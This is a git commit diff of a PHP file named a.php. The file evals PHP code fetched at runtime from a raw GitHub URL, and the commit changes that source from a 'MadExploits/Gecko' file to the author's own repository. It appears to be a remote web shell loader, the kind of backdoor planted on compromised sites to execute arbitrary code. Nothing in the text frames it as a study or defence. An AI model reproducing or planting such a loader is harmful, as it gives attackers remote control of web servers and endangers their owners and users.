9067fe16cb6f69817213b5a95671fe2947e75837
jamur4d <jamur4d@gmail.com>
2025-04-25 00:43:01 +0700

    Update a.php

--- a.php
+++ a.php
@@ -2,7 +2,7 @@
 eval( 
   urldecode("%3f%3e") . 
   file_get_contents(
-    urldecode("https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php")
+    urldecode("https://raw.githubusercontent.com/jamur4d/file/refs/heads/main/gecko.php")
   )
 );
 ?>
